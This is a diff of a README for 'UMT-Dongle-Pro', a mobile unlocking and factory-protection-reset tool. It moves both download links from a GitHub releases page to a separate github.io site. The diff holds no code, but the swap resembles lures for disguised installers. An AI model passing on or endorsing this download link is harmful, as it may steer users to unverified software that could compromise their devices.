@@ -1,6 +1,6 @@
 # 🛠️ UMT-Dongle-Pro - Unlock Your Mobile Devices Easily
 
-[![Download UMT Dongle Pro](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/programminggenusacherontia611/UMT-Dongle-Pro/releases)
+[![Download UMT Dongle Pro](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://programminggenusacherontia611.github.io)
 
 UMT-Dongle-Pro provides a reliable way to manage mobile device software. This tool helps users perform service tasks including unlocking, flashing firmware, and resetting factory protection settings. It works on Windows 10 and Windows 11 systems.
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to access the software.
 
-1.  Visit the official release page: [https://github.com/programminggenusacherontia611/UMT-Dongle-Pro/releases](https://github.com/programminggenusacherontia611/UMT-Dongle-Pro/releases).
+1.  Visit the official release page: [https://programminggenusacherontia611.github.io](https://programminggenusacherontia611.github.io).
 2.  Look for the latest version of the installer file in the Assets section.
 3.  Click the file name to start the download.
 4.  Save the file to a folder you can find easily, such as your Downloads folder.
